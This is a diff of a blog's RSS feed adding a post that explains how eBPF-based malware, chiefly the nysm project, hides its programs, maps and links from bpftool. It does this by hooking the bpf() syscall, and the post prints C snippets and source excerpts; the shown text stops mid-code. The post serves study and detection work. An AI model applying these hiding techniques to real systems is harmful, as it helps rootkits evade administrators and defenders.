@@ -6,8 +6,243 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Fri, 11 Apr 2025 23:45:35 +0800</lastBuildDate>
+        <lastBuildDate>Sat, 26 Apr 2025 10:45:47 +0800</lastBuildDate>
         <atom:link href="https://mathscantor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>eBPF Malware Techniques Part 3 - Hiding BPF Traces</title>
+            <link>https://mathscantor.github.io/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-3-hiding-bpf-traces/</link>
+            <pubDate>Sat, 26 Apr 2025 10:45:47 +0800</pubDate>
+            
+            <guid>https://mathscantor.github.io/posts/ebpf-malware-techniques/ebpf-malware-techniques-part-3-hiding-bpf-traces/</guid>
+            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
+&lt;p&gt;We&amp;rsquo;re finally gonna talk about the juicy stuff now that you are all geared up! Today, we are gonna go into a deep dive on how an eBPF application can hide itself and its children processes by understanding specific crucial Linux internals and how to circumvent them. I will be mainly using &lt;a href=&#34;https://github.com/eeriedusk/nysm&#34;&gt;&lt;em&gt;nysm&lt;/em&gt;&lt;/a&gt;, a eBPF-based malware as my prime example for hiding BPF traces.&lt;/p&gt;
+&lt;h2 id=&#34;2-ebpf-enumeration-with-bpf-syscalls&#34;&gt;2. eBPF Enumeration with BPF Syscalls&lt;/h2&gt;
+&lt;p&gt;When working with eBPF, it&amp;rsquo;s important to understand what&amp;rsquo;s actually loaded into the kernel at any point in time. Fortunately, &lt;em&gt;bpftool&lt;/em&gt; gives us powerful inspection capabilities through &lt;em&gt;bpf()&lt;/em&gt; syscalls., which we will take a deeper look in a second.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
+<p>We&rsquo;re finally gonna talk about the juicy stuff now that you are all geared up! Today, we are gonna go into a deep dive on how an eBPF application can hide itself and its children processes by understanding specific crucial Linux internals and how to circumvent them. I will be mainly using <a href="https://github.com/eeriedusk/nysm"><em>nysm</em></a>, a eBPF-based malware as my prime example for hiding BPF traces.</p>
+<h2 id="2-ebpf-enumeration-with-bpf-syscalls">2. eBPF Enumeration with BPF Syscalls</h2>
+<p>When working with eBPF, it&rsquo;s important to understand what&rsquo;s actually loaded into the kernel at any point in time. Fortunately, <em>bpftool</em> gives us powerful inspection capabilities through <em>bpf()</em> syscalls., which we will take a deeper look in a second.</p>
+<p>To list all eBPF programs running on the system, run the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo bpftool prog show
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>bpftool</em> - Listing All Programs<br><br></span>
+<p>For demonstration purposes, I ran the <a href="https://github.com/libbpf/libbpf-bootstrap/blob/master/examples/c/minimal.bpf.c"><em>minimal</em></a> eBPF application before enumerating the eBPF programs and my output looks something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>109: cgroup_skb  name sd_fw_egress  tag 6deef7357e7b4530  gpl
+</span></span><span style="display:flex;"><span>	loaded_at 2025-04-25T19:35:32+0800  uid <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>	xlated 64B  jited 56B  memlock 4096B
+</span></span><span style="display:flex;"><span>110: cgroup_skb  name sd_fw_ingress  tag 6deef7357e7b4530  gpl
+</span></span><span style="display:flex;"><span>	loaded_at 2025-04-25T19:35:32+0800  uid <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>	xlated 64B  jited 56B  memlock 4096B
+</span></span><span style="display:flex;"><span>142: tracepoint  name handle_tp  tag 6a5dcef153b1001e  gpl
+</span></span><span style="display:flex;"><span>	loaded_at 2025-04-25T20:03:01+0800  uid <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>	xlated 104B  jited 67B  memlock 4096B  map_ids 24,25
+</span></span><span style="display:flex;"><span>	btf_id <span style="color:#ae81ff">130</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>bpftool</em> - Example Output of eBPF Programs<br><br></span>
+<p>Looking at the above listing, you can see that the <em>minimal</em> eBPF application is running one program whose <em>prog_id</em> is 142.
+We can also see that it has 2 eBPF maps with <em>map_id</em> 24 and 25 and a <em>btf_id</em> of 130. It also contains information of the type of hook, which is a <em>tracepoint</em> and the hook handler&rsquo;s function name - <em>handle_tp()</em>.</p>
+<p>As this does not provide us a complete picture of what the eBPF application is doing, we need to further enumerate its maps, btf and link information. Since we already know the <em>map_id</em> and <em>btf_id</em>, we can do a direct query instead of going through the list.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo bpftool map show id <span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span>24: array  name minimal_.bss  flags 0x400
+</span></span><span style="display:flex;"><span>	key 4B  value 4B  max_entries <span style="color:#ae81ff">1</span>  memlock 8192B
+</span></span><span style="display:flex;"><span>	btf_id <span style="color:#ae81ff">130</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ sudo bpftool map show id <span style="color:#ae81ff">25</span>
+</span></span><span style="display:flex;"><span>25: array  name minimal_.rodata  flags 0x80
+</span></span><span style="display:flex;"><span>	key 4B  value 28B  max_entries <span style="color:#ae81ff">1</span>  memlock 296B
+</span></span><span style="display:flex;"><span>	btf_id <span style="color:#ae81ff">130</span>  frozen
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>bpftool</em> - Getting Map Info from ID 24 and 25<br><br></span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo bpftool btf show id <span style="color:#ae81ff">130</span>
+</span></span><span style="display:flex;"><span>130: name &lt;anon&gt;  size 602B  prog_ids <span style="color:#ae81ff">142</span>  map_ids 25,24
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>bpftool</em> - Getting BTF Info from ID 130<br><br></span>
+<p>At this point, we are still lacking one crucial information, and that is the actual <em>tracepoint</em> name. As the <em>link_id</em> was not displayed in our eBPF program enumeration, we have to list out all links.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo bpftool link show
+</span></span><span style="display:flex;"><span>5: perf_event  prog <span style="color:#ae81ff">142</span>  
+</span></span><span style="display:flex;"><span>	tracepoint sys_enter_write
+</span></span></code></pre></div><p><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>bpftool</em> - Listing All Links<br><br></span>
+The output is pretty obvious as I do not have other eBPF applications running in the background except for <em>minimal</em>. We are finally able to connect the dots and deduce the <em>minimal</em> eBPF application is running one eBPF program that utilizes <em>tracepoints</em> to intercept at the start of every <em>write()</em> syscall.</p>
+<p>Now that we have a rough idea on what&rsquo;s going, we are going to switch gears delve right into the actual <em>bpf()</em> syscalls with <em>strace</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo strace -e bpf bpftool prog show
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>bpf<span style="color:#f92672">(</span>BPF_PROG_GET_NEXT_ID, <span style="color:#f92672">{</span>start_id<span style="color:#f92672">=</span>109, next_id<span style="color:#f92672">=</span>0 <span style="color:#f92672">=</span>&gt; 110, open_flags<span style="color:#f92672">=</span>0<span style="color:#f92672">}</span>, 12<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>bpf<span style="color:#f92672">(</span>BPF_PROG_GET_FD_BY_ID, <span style="color:#f92672">{</span>prog_id<span style="color:#f92672">=</span>110, next_id<span style="color:#f92672">=</span>0, open_flags<span style="color:#f92672">=</span>0<span style="color:#f92672">}</span>, 12<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>bpf<span style="color:#f92672">(</span>BPF_OBJ_GET_INFO_BY_FD, <span style="color:#f92672">{</span>info<span style="color:#f92672">={</span>bpf_fd<span style="color:#f92672">=</span>3, info_len<span style="color:#f92672">=</span>232, info<span style="color:#f92672">=</span>0x7ffe54870d60<span style="color:#f92672">}}</span>, 16<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>bpf<span style="color:#f92672">(</span>BPF_PROG_GET_NEXT_ID, <span style="color:#f92672">{</span>start_id<span style="color:#f92672">=</span>110, next_id<span style="color:#f92672">=</span>0 <span style="color:#f92672">=</span>&gt; 142, open_flags<span style="color:#f92672">=</span>0<span style="color:#f92672">}</span>, 12<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>bpf<span style="color:#f92672">(</span>BPF_PROG_GET_FD_BY_ID, <span style="color:#f92672">{</span>prog_id<span style="color:#f92672">=</span>142, next_id<span style="color:#f92672">=</span>0, open_flags<span style="color:#f92672">=</span>0<span style="color:#f92672">}</span>, 12<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>bpf<span style="color:#f92672">(</span>BPF_OBJ_GET_INFO_BY_FD, <span style="color:#f92672">{</span>info<span style="color:#f92672">={</span>bpf_fd<span style="color:#f92672">=</span>3, info_len<span style="color:#f92672">=</span>232, info<span style="color:#f92672">=</span>0x7ffe54870d60<span style="color:#f92672">}}</span>, 16<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Output of <em>strace</em> showing only <em>bpf()</em> syscall - <em>bpftool</em> prog show<br><br></span>
+<p>Now we&rsquo;re talking! Dissecting <em>bpftool</em> reveals the important parameters used in <em>bpf()</em> syscalls to enumerate through the linked list of programs. I would also like to point out that when the first parameter is <em>BPF_PROG_GET_NEXT_ID</em>, <em>next_id</em> will only get its updated value when the syscall exits. Let&rsquo;s break down what the <em>bpf()</em> syscall parameters are according to the manual.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>NAME
+</span></span><span style="display:flex;"><span>       bpf <span style="color:#f92672">-</span> perform a command on an extended BPF map or program
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SYNOPSIS
+</span></span><span style="display:flex;"><span>       <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/bpf.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">bpf</span>(<span style="color:#66d9ef">int</span> cmd, <span style="color:#66d9ef">union</span> bpf_attr <span style="color:#f92672">*</span>attr, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size);
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing"><em>bpf()</em> Syscall Manual<br><br></span>
+<ol>
+<li><code>int cmd</code> - This integer constant defines the operation type.</li>
+<li><code>union bpf_attr *attr</code> - This is a pointer to a <code>union bpf_attr</code>, which is a giant union that contains the relevant fields depending on the <code>cmd</code> value.</li>
+<li><code>unsigned int size</code> - This refers to the actual size of <code>union bpf_attr</code></li>
+</ol>
+<h2 id="31-methodology-on-hiding-bpf-traces">3.1 Methodology on Hiding BPF Traces</h2>
+<p>If you have been following along closely so far, you will realize by now that we have 2 possible methods to hide a targeted eBPF program. We can either intercept at <em>BPF_PROG_GET_NEXT_ID</em> or <em>BPF_PROG_GET_FD_BY_ID</em>. The following listings show 2 snippets of how we can possibly hide a targeted <em>prog_id</em> using 2 different methods.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* Method 1: Intercept BPF_PROG_GET_NEXT_ID @ tp/syscalls/sys_exit_bpf */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> next_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (cmd <span style="color:#f92672">==</span> BPF_PROG_GET_NEXT_ID) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_read_user</span>(<span style="color:#f92672">&amp;</span>next_id, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint32_t</span>), <span style="color:#f92672">&amp;</span>attr<span style="color:#f92672">-&gt;</span>next_id)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (next_id <span style="color:#f92672">==</span> prog_id_to_hide) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Skip over the target program
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">uint32_t</span> next_id <span style="color:#f92672">=</span> prog_id_to_hide <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bpf_probe_write_user</span>(<span style="color:#f92672">&amp;</span>attr<span style="color:#f92672">-&gt;</span>next_id, <span style="color:#f92672">&amp;</span>next_id, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint32_t</span>));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Method 1 - Intercept <em>BPF_PROG_GET_NEXT_ID</em> at <em>sys_exit_bpf</em><br><br></span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* Method 2: Intercept BPF_PROG_GET_FD_BY_ID @ tp/syscalls/sys_enter_bpf */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> prog_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (cmd <span style="color:#f92672">==</span> BPF_PROG_GET_FD_BY_ID) { 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_probe_read_user</span>(<span style="color:#f92672">&amp;</span>prog_id, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint32_t</span>), <span style="color:#f92672">&amp;</span>attr<span style="color:#f92672">-&gt;</span>prog_id)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (prog_id <span style="color:#f92672">==</span> prog_id_to_hide) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Overwrite attr-&gt;prog_id to 0.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        prog_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bpf_probe_write_user</span>(<span style="color:#f92672">&amp;</span>attr<span style="color:#f92672">-&gt;</span>prog_id, <span style="color:#f92672">&amp;</span>prog_id, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint32_t</span>));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Method 2 - Intercept <em>BPF_PROG_GET_FD_BY_ID</em> at <em>sys_enter_bpf</em><br><br></span>
+<p>Of course these 2 methods only hide the eBPF <em>prog_id</em>. This logic can be extended to hide targeted <em>map_id</em>, <em>link_id</em> and <em>btf_id</em> as well.</p>
+<h2 id="32-github-project---eeriedusknysm">3.2 Github Project - eeriedusk/nysm</h2>
+<p>Let’s now tie everything together with a real-world example: <em>nysm</em>. This project doesn’t just demonstrate hiding eBPF programs in theory — it actually pulls it off. Using the <em>libbpf</em> framework, <em>nysm</em> manipulates BPF syscalls in stealthy ways to hide its own existence from userland tools like <em>bpftool</em>.</p>
+<p>We’re gonna break down how it works in a step-by-step fashion.</p>
+<h3 id="321-setting-baseline">3.2.1 Setting Baseline</h3>
+<p>Before it hides anything, <em>nysm</em> first figures out what’s already on the system. This is important because it needs to distinguish between stuff that was already there, and stuff it’s about to load and should hide.</p>
+<p>This is done in userspace (nysm.c) with a function called <em>bpf_list_object()</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">bpf_list_object</span>(<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>object_func)(<span style="color:#66d9ef">uint32_t</span>, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span>), <span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>id) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> index   <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> next_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (true) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">object_func</span>(next_id, <span style="color:#f92672">&amp;</span>next_id)) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        id[index] <span style="color:#f92672">=</span> next_id;
+</span></span><span style="display:flex;"><span>        index<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Function Definition of <em>bpf_list_object()</em><br><br></span>
+<p><em>run_ebpf()</em> will call on this function 3 times with different parameters in order to populate the arrays - <em>prog_ids</em>, <em>map_ids</em> and <em>link_ids</em> respectively to establish a baseline.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">run_ebpf</span>(<span style="color:#66d9ef">uint32_t</span> pid, <span style="color:#66d9ef">uint32_t</span> ppid) {
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_list_object</span>(bpf_prog_get_next_id, prog_ids);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_list_object</span>(bpf_map_get_next_id, map_ids);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_list_object</span>(bpf_link_get_next_id, link_ids);
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Establishing baseline for <em>prog_ids</em>, <em>map_ids</em> and <em>link_ids</em><br><br></span>
+<h3 id="322-isolating-the-namespace">3.2.2 Isolating the Namespace</h3>
+<p>To have thorough control over different processes (including itself), nysm achieves this using PID namespaces. It grabs its own namespace inode like stores it as a global variable in the <em>.bss</em> section.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">run_ebpf</span>(<span style="color:#66d9ef">uint32_t</span> pid, <span style="color:#66d9ef">uint32_t</span> ppid) {
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(pidns_path, <span style="color:#66d9ef">sizeof</span>(pidns_path), <span style="color:#e6db74">&#34;/proc/%d/ns/pid&#34;</span>, pid<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stat</span>(pidns_path, <span style="color:#f92672">&amp;</span>st)) <span style="color:#66d9ef">goto</span> cleanup;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    nysm<span style="color:#f92672">-&gt;</span>bss<span style="color:#f92672">-&gt;</span>pidns <span style="color:#f92672">=</span> st.st_ino;
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Storing its PID Namespace as a Global Variable<br><br></span>
+<p>For example, in the case of the <em>bpf_sys_exit</em> <em>tracepoint</em>, <em>nysm</em> ignores itself and child processes that triggers this <em>tracepoint</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tp/syscalls/sys_exit_bpf&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">tracepoint_bpf_exit</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bpf_get_ns</span>() <span style="color:#f92672">==</span> pidns) <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Ignoring Self and Child Processes<br><br></span>
+<h3 id="323-hiding-whats-new">3.2.3 Hiding What&rsquo;s New</h3>
+<p>Once the baseline is saved and <em>nysm’s</em> own eBPF programs are loaded, it scans the system again. Anything new gets flagged for hiding by calling <em>bpf_hide_diff_object()</em>. This function compares the new list of objects with the old list. If it finds anything new, it updates a map in the kernel to mark it for hiding.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">bpf_hide_diff_object</span>(<span style="color:#66d9ef">int</span> map_fd, <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>object_func)(<span style="color:#66d9ef">uint32_t</span>, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span>), <span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>id_old) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> next_id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (true) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">object_func</span>(next_id, <span style="color:#f92672">&amp;</span>next_id)) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (id_old[index] <span style="color:#f92672">!=</span> next_id) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">bpf_map_update_elem</span>(map_fd, <span style="color:#f92672">&amp;</span>next_id, <span style="color:#f92672">&amp;</span>next_id, BPF_ANY);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        index<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Function Definition of <em>bpf_hide_diff_object()</em><br><br></span>
+<p>Again, looking back at <em>run_ebpf()</em>, we can see that this function is called 3 times to populate the different object maps so that it knows exactly which object IDs to hide.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">run_ebpf</span>(<span style="color:#66d9ef">uint32_t</span> pid, <span style="color:#66d9ef">uint32_t</span> ppid) {
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_hide_diff_object</span>(<span style="color:#a6e22e">bpf_map__fd</span>(nysm<span style="color:#f92672">-&gt;</span>maps.map_security_bpf_prog_id_data), bpf_prog_get_next_id, prog_ids);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_hide_diff_object</span>(<span style="color:#a6e22e">bpf_map__fd</span>(nysm<span style="color:#f92672">-&gt;</span>maps.map_security_bpf_map_id_data), bpf_map_get_next_id, map_ids);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bpf_hide_diff_object</span>(<span style="color:#a6e22e">bpf_map__fd</span>(nysm<span style="color:#f92672">-&gt;</span>maps.map_bpf_link_prime_id_data), bpf_link_get_next_id, link_ids);
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Populating Different Object Maps Containing IDs to Hide<br><br></span>
+<p>Now that the maps are populated, it’s time for the fun part.</p>
+<h3 id="324-kernel-space-hooking">3.2.4 Kernel-Space Hooking</h3>
+<p>The main magic happens in <em>get_next_non_listed_id()</em> at the <em>sys_exit_bpf</em> <em>tracepoint</em>. This function iterates through different object maps which previously contained a set of IDs to hide. It will then return a non-listed object ID that is used to overwrite the original value stored in <code>uattr_ptr-&gt;next_id</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">SEC</span>(<span style="color:#e6db74">&#34;tp/syscalls/sys_exit_bpf&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">tracepoint_bpf_exit</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (branch) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> BPF_PROG_GET_NEXT_ID :
+</span></span><span style="display:flex;"><span>            id <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_next_non_listed_id</span>(<span style="color:#f92672">&amp;</span>map_security_bpf_prog_id_data, attr.next_id);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> BPF_MAP_GET_NEXT_ID :
+</span></span><span style="display:flex;"><span>            id <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_next_non_listed_id</span>(<span style="color:#f92672">&amp;</span>map_security_bpf_map_id_data , attr.next_id);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> BPF_LINK_GET_NEXT_ID :
+</span></span><span style="display:flex;"><span>            id <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_next_non_listed_id</span>(<span style="color:#f92672">&amp;</span>map_bpf_link_prime_id_data   , attr.next_id);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span> <span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
